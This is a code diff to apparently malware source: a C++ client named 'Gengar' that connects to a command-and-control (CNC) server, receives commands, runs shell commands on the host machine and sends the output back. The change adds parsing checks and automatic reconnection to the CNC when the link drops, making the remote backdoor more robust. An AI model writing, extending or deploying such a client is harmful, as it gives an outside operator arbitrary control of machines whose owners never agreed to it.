@@ -1,4 +1,4 @@
-#include <string>
+#include <iostream>
 #include "gengar.h"
 
 void Gengar::ListenForCommand()
@@ -7,10 +7,29 @@ void Gengar::ListenForCommand()
 
 	while (true)
 	{
-		std::string input = m_client.Receive();
-		std::string type = input.substr(0, type_content_delimiter);
-		std::string content = input.substr(type_content_delimiter, input.size());
-		RouteCommand(type, content);
+		try
+		{
+			std::string input = m_client.Receive();
+			std::cout << "Received command: " << input << std::endl;
+			size_t delimiter_index = input.find(type_content_delimiter);
+
+			if (delimiter_index == std::string::npos)
+			{
+				m_client.Send("Invalid command. Ignoring.");
+			}
+			else
+			{
+				std::string type = input.substr(0, delimiter_index);
+				std::string content = input.substr(delimiter_index + 1, input.size());
+				RouteCommand(type, content);
+			}
+		}
+		catch (boost::system::system_error&)
+		{
+			std::cout << "Disconnected from CNC." << std::endl;
+			ConnectToCnc();
+			ListenForCommand();
+		}
 	}
 }
 
@@ -21,7 +40,7 @@ void Gengar::RouteCommand(std::string& type, std::string& content)
 	{
 		output = m_machine.RunShellCommand(content);
 	}
-	m_client.Send(output);
+	m_client.Send(std::move(output));
 }
 
 void Gengar::ConnectToCnc()
